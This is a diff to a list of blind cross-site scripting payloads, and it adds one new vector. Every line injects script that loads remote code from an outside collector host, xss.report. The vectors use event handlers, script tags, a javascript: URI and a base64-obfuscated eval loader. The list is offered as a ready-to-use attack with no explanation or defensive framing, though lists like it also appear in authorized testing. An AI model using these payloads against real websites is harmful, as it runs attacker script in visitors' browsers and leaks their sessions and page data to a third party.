@@ -1,6 +1,7 @@
 <svg/onload=import('//xss.report/c/hnterx')
 <img/src/onerror=import('//xss.report/c/hnterx');//>
 '"><script src=https://xss.report/c/hnterx?1></script>
+';"/></textarea></script><script src="https://xss.report/c/hnterx?1"></script>
 "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2hudGVyeD8yIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw== onerror=eval(atob(this.id))>
 javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/hnterx?3\';document.body.appendChild(a)')
 var a=document.createElement("script");a.src="https://xss.report/c/hnterx?4";document.body.appendChild(a);
